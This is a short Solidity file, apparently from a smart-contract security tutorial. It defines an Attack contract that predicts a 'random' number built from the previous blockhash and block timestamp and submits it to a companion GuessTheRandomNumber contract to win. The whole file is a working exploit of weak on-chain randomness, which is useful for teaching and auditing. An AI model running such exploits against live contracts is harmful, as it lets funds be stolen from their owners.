// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./GuessTheRandomNumber.sol";


contract Attack {
    GuessTheRandomNumber public guessTheRandomNumber;

    receive() external payable {}

    function attack(address _guessTheRandomNumberAddress) public {
        guessTheRandomNumber = GuessTheRandomNumber(_guessTheRandomNumberAddress);

        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        guessTheRandomNumber.guess(answer);
    }

}